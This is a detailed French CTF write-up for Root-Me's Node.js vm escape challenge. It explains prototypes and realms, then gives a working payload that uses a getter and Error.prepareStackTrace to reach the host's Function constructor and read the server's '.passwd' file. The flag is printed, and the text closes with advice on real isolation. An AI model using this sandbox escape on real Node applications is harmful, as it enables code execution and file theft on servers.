# Writeup — Root-Me : NodeJS - VM escape

> **Flag :** `NodeJS_vm_1s_n0t_a_s3cur1ty_m0dul3!!!`
>
> Challenge : exécuter du code dans une « sandbox » Node.js (`vm`) et réussir à en sortir pour lire le fichier `.passwd` du serveur.

Ce writeup est volontairement détaillé et part de zéro. Si tu connais déjà JavaScript et les prototypes, tu peux sauter directement à la partie **« 6. L'idée qui débloque tout »**.

---

## 1. Le challenge en une phrase

Le site te propose un champ où tu écris du **code JavaScript**. Le serveur l'exécute dans un **bac à sable** (module `vm` de Node) censé t'empêcher d'accéder au système, puis t'affiche le résultat. Le but : **t'évader du bac à sable** pour lire le flag stocké dans le fichier `.passwd`.

---

## 2. Le code source du serveur (l'essentiel)

```js
const vm = require('vm');
const fs = require('fs');

FLAG = fs.readFileSync('.passwd', {encoding:'utf8', flag:'r'});   // (1)

app.post('/', urlencodedParser, function (req, res) {
    const code = req.body.code + '';           // ton code, en texte
    if (code.length != 0) {
        try {
            data = vm.runInNewContext(          // (2) exécute ton code
                code,
                vm.createContext(Object.create(null)),  // (3) contexte "vide"
                { timeout: 200 }                // (4) 200 ms max
            );
            if (data !== undefined) {
                if (data['result'] !== undefined) {     // (5) <-- POINT CLÉ
                    result = {result: data['result']};
                } else {
                    result = {result: data};
                }
            } else {
                result = {result: "undefined"};
            }
        } catch (err) {
            result = {result: err};             // (6) les erreurs sont affichées
        }
    }
    // ... puis le serveur affiche result['result'] dans la page
});
```

Décortiquons les points importants :

- **(1)** `FLAG` est lu dans un fichier et stocké **sans `var`/`let`/`const`**. En JavaScript, une variable déclarée comme ça devient une **variable globale** du processus serveur. Retiens ça : le flag vit dans la mémoire du serveur.
- **(2)** `vm.runInNewContext(code, …)` : exécute **ton** code dans un environnement séparé.
- **(3)** `Object.create(null)` : crée un objet **totalement vide**, sans même les propriétés habituelles. C'est le « monde » dans lequel ton code va tourner. L'idée du concepteur : te priver de tout outil.
- **(4)** `timeout: 200` : ton code a 200 millisecondes pour s'exécuter (anti-boucle-infinie).
- **(5)** **LE POINT QUI VA TOUT CHANGER** : le serveur fait `data['result']`, c'est-à-dire qu'il **lit la propriété `result`** de l'objet que ton code a renvoyé. On y reviendra, c'est la faille.
- **(6)** Si ton code plante, l'erreur est renvoyée à l'écran. Pratique pour déboguer tes tentatives.

---

## 3. Notions de base indispensables

### 3.1 Un « bac à sable » (sandbox)

Un bac à sable, c'est un espace isolé où l'on fait tourner du code auquel on ne fait pas confiance, pour l'empêcher de toucher au reste du système. Le module `vm` de Node **ressemble** à ça… mais, comme on va le voir (et comme le dit le flag), **ce n'est pas un vrai outil de sécurité**. C'est écrit noir sur blanc dans la documentation officielle de Node.

### 3.2 Les prototypes et `constructor` (le cœur de JavaScript)

En JavaScript, **tout objet est fabriqué par une fonction** appelée son **constructeur**, et chaque objet garde un lien vers lui :

```js
[].constructor          // => la fonction Array (c'est elle qui crée les tableaux)
"".constructor          // => la fonction String
({}).constructor        // => la fonction Object
```

Et voici l'astuce historique : **une fonction est elle-même un objet**, fabriqué par une fonction spéciale nommée **`Function`**. Donc :

```js
[].constructor               // => Array (une fonction)
[].constructor.constructor   // => Function  ★
```

Pourquoi `Function` est dangereux ? Parce qu'il **fabrique du code à partir de texte** :

```js
const f = Function('return 1 + 1');   // crée une fonction depuis une chaîne
f();                                   // => 2
```

C'est l'équivalent d'un `eval`. Si on met la main sur le **bon** `Function`, on peut exécuter n'importe quel code.

### 3.3 La notion de « realm » (royaume) — **à bien comprendre**

Un **realm**, c'est un jeu complet d'objets natifs du langage : *son* `Object`, *son* `Array`, *son* `Function`, etc. 

Détail crucial : **chaque contexte `vm` a son propre realm**. Donc la sandbox possède son **propre `Function`**, différent du `Function` du serveur (l'« hôte »).

➡️ Conséquence : si tu obtiens `Function` **de la sandbox**, le code que tu fabriques s'exécute **dans la sandbox** (où il n'y a ni `process`, ni `FLAG`).
➡️ Pour gagner, il faut obtenir `Function` **de l'hôte**, car le code fabriqué par lui s'exécute **dans le processus serveur**, là où se trouvent `process`, `require` et le flag.

**Tout le challenge se résume à cette phrase :** *comment attraper un objet qui appartient au realm de l'hôte, et non à celui de la sandbox ?*

---

## 4. Première tentative (naïve) et pourquoi elle échoue

L'instinct, c'est d'écrire :

```js
({ result: [].constructor.constructor('return this.FLAG')() })
```

**Résultat obtenu : `[object Object]`** (pas le flag). Deux raisons :

1. `[]` est un tableau **créé par la sandbox**. Donc `[].constructor.constructor` = le `Function` **de la sandbox**. Le code `'return this.FLAG'` s'exécute **dans la sandbox**, où `this` est l'objet vide et `this.FLAG` vaut `undefined`.
2. Du coup ton code renvoie `{result: undefined}`. Côté serveur, `data['result']` vaut `undefined`, donc il part dans la branche `else` et finit par afficher un objet imbriqué → d'où le fameux `[object Object]`.

**La leçon :** partir d'un littéral (`[]`, `""`, `{}`) ne marche pas, car ils appartiennent tous au realm de la **sandbox**.

---

## 5. Les autres pistes classiques (toutes bloquées ici)

On a testé méthodiquement contre le serveur. Toutes échouent, car le serveur tourne une version de Node **durcie** :

| Tentative | Pourquoi ça rate |
|---|---|
| `this.FLAG` | `this` = le global **de la sandbox** (vide) |
| `[].constructor.constructor(...)` | realm **sandbox** |
| `console.log.constructor.constructor(...)` | le `console` injecté est **enveloppé** dans le realm sandbox |
| `process`, `require`, `global`, `Buffer`… | **inexistants** dans le contexte |
| `Error.prepareStackTrace` sur une erreur « normale » | les fonctions de l'hôte dans la pile sont **masquées** (`getFunction()` renvoie `undefined`) |

Bref, en restant « dans son coin », impossible de trouver un objet de l'hôte.

---

## 6. L'idée qui débloque tout : faire en sorte que **l'hôte t'appelle**

Reviens au **point (5)** du code serveur :

```js
if (data['result'] !== undefined) { ... }
```

Le serveur **lit la propriété `result`** de l'objet que tu renvoies. Et en JavaScript, on peut définir une propriété qui est en réalité une **fonction déguisée** : un **getter**.

```js
({
  get result() {
    // ce code s'exécute QUAND quelqu'un lit l'objet .result
    return 42;
  }
})
```

Si je renvoie un objet avec un getter `result`, alors au moment où le serveur écrit `data['result']`, **c'est MON code qui s'exécute, mais déclenché par le code de l'hôte**.

### Pourquoi c'est décisif ?

Quand ta fonction est appelée **par l'hôte**, la **pile d'appels** (la liste des fonctions en cours, les unes dans les autres) contient, juste au-dessus de la tienne, une **fonction de l'hôte encore active**. Et là — contrairement à une erreur créée « à froid » — V8 (le moteur) **ne masque plus cette fonction** : on peut la récupérer.

On a vérifié en direct en inspectant la pile depuis le getter :

```
0: get result   -> fonction  (realm SANDBOX)   ← mon getter
1: (anonyme)     -> fonction  (realm HÔTE) ★    ← la fonction du serveur qui m'appelle
2: handle        -> (masquée)                   ← Express
...
```

La **frame n°1 est une fonction de l'hôte**, et on peut l'attraper. C'est notre pont vers le realm du serveur. 🎯

---

## 7. Le payload final

```js
({
  get result(){
    // 1) Récupérer les objets "CallSite" bruts de la pile au lieu d'un texte
    Error.prepareStackTrace = function(e, frames){ return frames; };
    var frames = new Error().stack;

    // 2) Référence du Function de la SANDBOX, pour reconnaître ce qui vient de l'hôte
    var sbF = (function(){}).constructor;

    // 3) Chercher la première fonction de la pile qui vient d'un AUTRE realm (l'hôte)
    var hostFn;
    for (var i = 1; i < frames.length; i++){
      var fn = frames[i].getFunction();
      if (typeof fn === 'function' && fn.constructor !== sbF){ hostFn = fn; break; }
    }

    // 4) Depuis cette fonction hôte, remonter jusqu'au Function de l'HÔTE
    var HostFunction = hostFn.constructor.constructor;

    // 5) Fabriquer du code qui s'exécute côté serveur et lit le flag
    return HostFunction('return process.mainModule.require("fs").readFileSync(".passwd","utf8")')();
  }
})
```

Tu colles ça dans le champ `code` du site, tu valides, et le flag s'affiche dans la zone de résultat.

> Astuce : pas besoin d'emballer le retour dans `{result: ...}`. La valeur renvoyée (une chaîne) remonte directement dans `data['result']`, que le serveur affiche tel quel.

---

## 8. Le payload expliqué ligne par ligne

1. **`get result(){ … }`**
   On transforme la lecture `data['result']` du serveur en **appel de notre fonction, déclenché par l'hôte**. C'est ce qui place une fonction de l'hôte juste au-dessus de nous dans la pile.

2. **`Error.prepareStackTrace = (e, frames) => frames`**
   Normalement, `error.stack` est un texte. En redéfinissant `prepareStackTrace`, on demande à récupérer les **objets `CallSite`** (un par ligne de la pile), qui offrent des méthodes comme `getFunction()`.

3. **`new Error().stack`**
   On déclenche la capture de la pile **pile au moment** où l'hôte nous appelle. La pile contient donc la frame hôte « vivante ».

4. **`var sbF = (function(){}).constructor;`**
   `sbF` est le `Function` **de la sandbox**. Il sert de **repère** : toute fonction dont le `.constructor` est **différent** de `sbF` appartient à un **autre realm** → c'est l'hôte.

5. **La boucle `for`**
   On parcourt les frames et on garde la première fonction qui vient de l'hôte (`fn.constructor !== sbF`). C'est la frame n°1 repérée plus haut.

6. **`hostFn.constructor.constructor`**
   - `hostFn.constructor` = le `Function` **de l'hôte**.
   - `.constructor` encore une fois = toujours ce `Function` hôte (une fonction est fabriquée par `Function`).
   On tient donc un **générateur de code qui s'exécute dans le realm de l'hôte**.

7. **`HostFunction('return process…')()`**
   On fabrique et on exécute une fonction **côté serveur**. Là, `process`, `require` et `fs` existent. On lit `.passwd` → **le flag**.

---

## 9. Schéma récapitulatif

```
Serveur (HÔTE)                         Sandbox (ton code)
──────────────                         ──────────────────
data['result']  ───── déclenche ─────► get result()          [frame 0, realm SANDBOX]
   (frame 1, realm HÔTE) ◄──── est au-dessus dans la pile ───┘
        │
        │  frames[1].getFunction()        → fonction HÔTE
        │  .constructor.constructor        → Function HÔTE
        ▼
   HostFunction('return process…')()   s'exécute DANS le serveur
        │
        ▼
   fs.readFileSync('.passwd')  ───────►  FLAG
```

---

## 10. Ce qu'il faut retenir (les leçons de sécurité)

1. **`vm` n'est PAS une barrière de sécurité.** C'est littéralement le message du flag : `NodeJS_vm_1s_n0t_a_s3cur1ty_m0dul3`. Le module `vm` isole les *variables globales*, pas le *processus*.

2. **Vider le contexte ne suffit pas.** `Object.create(null)` enlève des outils, mais il suffit d'**un seul objet de l'hôte qui traverse la frontière** pour remonter jusqu'à son realm et tout récupérer.

3. **La frontière fuit dès que l'hôte appelle du code de la sandbox.** Ici, le simple `data['result']` du serveur ouvre la porte via un **getter**. Toute interaction hôte → sandbox (getter, `toString`, callback, piège de `Proxy`…) est une fenêtre d'évasion.

4. **Comment se protéger pour de vrai ?**
   - Ne jamais exécuter du code non fiable dans le **même processus** que des données sensibles.
   - Utiliser une vraie isolation : **processus séparé** à privilèges réduits, **conteneur**, **gVisor / micro-VM**, ou la bibliothèque **`isolated-vm`** (tenue à jour).
   - Éviter `vm2` (déprécié, plusieurs évasions publiques).

---

## 11. Pour aller plus loin

- Documentation Node `vm` (lire l'avertissement « The vm module is not a security mechanism »).
- [Sandboxing NodeJS is hard, here is why](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)
- [Eval no more: VM, VM2 and Expression Language](https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/)
- [The Insecure Node.js vm Module](https://eslam.io/posts/unsecure-node-vm/)
